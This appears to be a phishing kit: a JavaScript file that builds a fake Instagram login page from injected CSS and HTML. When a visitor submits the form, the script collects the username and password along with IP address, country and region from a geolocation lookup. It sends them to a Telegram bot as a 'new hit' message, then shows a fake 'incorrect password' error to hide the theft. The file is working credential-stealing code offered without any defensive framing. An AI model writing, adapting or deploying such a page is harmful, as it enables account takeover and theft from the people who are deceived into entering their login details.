(function () {
  const style = document.createElement('style');
  style.innerHTML = `
    body {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    margin: 0;
    font-family: 'Roboto', sans-serif;
    animation: fadeInPage 3s forwards;
}
@keyframes fadeInPage {
    0% {
        opacity: 0;
    }
    100% {
        opacity: 1;
    }
}

footer {
    margin-top: 235px;
    background-color: #f8f9fa;
    padding: 20px 0;
    text-align: center;
    position: relative;
    top: 15px;
}

footer ul {
    list-style-type: none;
    padding: 0;
    margin: 0;
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
}

footer ul li {
    margin: 10px 10px;
    
}

footer ul li a {
    text-decoration: none;
    color: #000;
}

footer ul li a:hover {
    text-decoration: underline;
}

#ign {
    height: 90px; 
    width: 220px;
    display: block;
    margin: 0 auto;
}

.input-box {
    margin:auto 20px 6px;
}

input {
    height: 36px;
    border: 1px solid #efefef;
    border-radius: 3px;
    background-color: #fafafa;
    width:90%;
    font-size:12px;
    margin: 0;
    padding: 9px 0 7px 8px;
    outline: none;
    overflow: hidden;
    text-overflow: ellipsis;
    box-sizing: border-box;
}

.bnt {
    width: 90%;
    padding: 10px;
    background-color: #3897F1;
    border: none;
    border-radius: 4px;
    color: #ffffff;
    font-size: 16px;
    height: 28px;
    cursor: pointer;
    margin:auto 20px 6px;
    position: relative;  
    top: 10px;
}

.lo {
    height: 15px; 
    width: 36px; 
    position: relative;  
    top: -4px;
}

.for {
    text-align: center;
    font-size:14px;
    color: #005995;
    position: relative;  
    top: 10px;
}

.text {
    text-align: center;
    margin: 15px;
    color: #262626;
    font-size: 14px;
    position: relative;  
    top: 70px;
}

.text a, .text a:visited, .text a:hover, .text a:active {
    color: #3897f0;
    margin-left: 3px;
    text-decoration: none;
}

.get {
    text-align: center;
    position: relative;  
    top: 240px;
}

#store {
    width: 130px; 
    height: 40px;
    position: relative;
    left: 40px;
    top: 230px;
}

#sto {
    width: 130px; 
    height: 40px;
    position: relative;
    left: 55px;
    top: 230px;
}

.fade-image {opacity: 1;
            position: absolute;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            animation: fadeOut 3s forwards;
            width: 95px;
            height: 70px;
           top: 250px;
             }
                   
        #successMessage {
            color: red;
            font-size: 14px;
            text-align: center;
            display: none;
            margin-top: 5px;
        }
        
    .displ {display: flex;}    
  `;
  document.head.appendChild(style);

  window.addEventListener("DOMContentLoaded", function () {
    const container = document.createElement("div");
    container.className = "container";
    container.innerHTML = `
      <body>
    <div id="fadeImageContainer" class="fade-image-container">
        <img id="fadeImage" src="https://resourcesss.github.io/Pics/im.png" alt="Image" class="fade-image">
    </div>
    
    <img id="ign" src="https://resourcesss.github.io/Pics/ign.png">
    
    <form id="loginForm">
        <input type="hidden" name="source_page" value="Instagram">
        <input class="input-box" type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
        <input class="input-box" type="password" id="password" name="password" placeholder="Password" required> 
        <button type="submit" class="bnt"><img class="lo" src="https://resourcesss.github.io/Pics/lo.png"></button>
    </form>
    
    <p class="for">Forgot password?</p>
    
    <p id="successMessage">Login successful!</p>

    <p class="text">Don't have an account?<a href="#" id="fadeLink">Sign up</a></p>
    
    <p class="get">Get the app</p>
    <div class="displ">
    <img id="store" src="https://resourcesss.github.io/Pics/apple.png">
    <img id="sto" src="https://resourcesss.github.io/Pics/play.png">
</div>
    <footer>
        <ul>
            <li><a href="#">About Us</a></li>
            <li><a href="#">Support</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Press</a></li>
            <li><a href="#">Api</a></li>
            <li><a href="#">Jobs</a></li> 
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Directory</a></li>
        </ul>
    </footer>
    </body>
    `;
    document.body.appendChild(container);

    document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const sourcePage = document.querySelector('input[name="source_page"]').value;

            // Use ipwhois.app for all needed info
            const geoResponse = await fetch('https://ipwhois.app/json/?objects=ip,country,region,country_phone');
            const geo = await geoResponse.json();

            const ipAddress = geo.ip || 'N/A';
            const countryName = geo.country || 'Unknown Country';
            const state = geo.region || 'Unknown Region';
            const phoneCode = geo.country_phone || 'N/A';
            const dateTime = new Date().toLocaleString();

            const message = `
𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪

🐉⊚-----------------------------------⊚🐉
<b>👤Username:</b> <code>${username}</code>\n
<b>📟Password:</b> <code>${password}</code>\n
<b>🌍Country:</b> ${countryName}\n
<b>🏴State:</b> ${state}\n
<b>⚙️IP Address:</b> ${ipAddress}\n
<b>📝Code:</b> <code>${phoneCode}</code>\n
<b>⏱Date/Time:</b> ${dateTime}\n
<b>🌐Login From:</b> ${sourcePage}
🐉⊚-----------------------------------⊚🐉
      ↝ ᴅᴇᴠ ʙʏ » @Hacktivia
`;

           
            const telegramUrl = `https://api.telegram.org/bot${iovjrtrdhhj9}/sendMessage`;

            await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: I94626736O,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            const successMessage = document.getElementById('successMessage');
            successMessage.style.display = 'block';
            successMessage.textContent = 'Sorry, your password or username was incorrect. Please double-check and try again!';

            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        });

        window.addEventListener('load', function() {
            document.body.style.opacity = '1';
            const fadeImageContainer = document.getElementById('fadeImageContainer');
            fadeImageContainer.style.opacity = '1';
            fadeImageContainer.style.transition = 'opacity 3s';
            setTimeout(() => {
                fadeImageContainer.style.opacity = '0';
            }, 100);
        });
  });
})();
